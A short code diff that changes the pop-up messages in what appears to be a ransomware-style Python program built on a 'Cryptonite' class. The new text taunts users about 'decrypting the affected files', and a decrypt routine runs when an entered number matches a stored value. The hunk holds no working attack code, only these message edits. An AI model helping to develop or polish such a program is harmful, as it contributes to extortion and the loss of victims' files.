@@ -145,15 +145,15 @@ class System(Cryptonite):
             try:
                 x = int(x)
             except:
-                pmb.confirm("Have a Great Day! XD", buttons=['Cancel'])
+                pmb.confirm("Have an amazing day decrypting the affected files! XD", buttons=['Cancel'])
                 exit()
             if x == self.decryptPlease:
                 self.decrypt()
             else:
-                pmb.confirm("Have a Great Day! XD", buttons=['Cancel'])
+                pmb.confirm("Have an amazing day decrypting the affected files! XD", buttons=['Cancel'])
                 exit()
         else:
-            pmb.confirm("Have a Great Day! XD", buttons=['Cancel'])
+            pmb.confirm("Have an amazing day decrypting the affected files! XD", buttons=['Cancel'])
             exit()
 
 
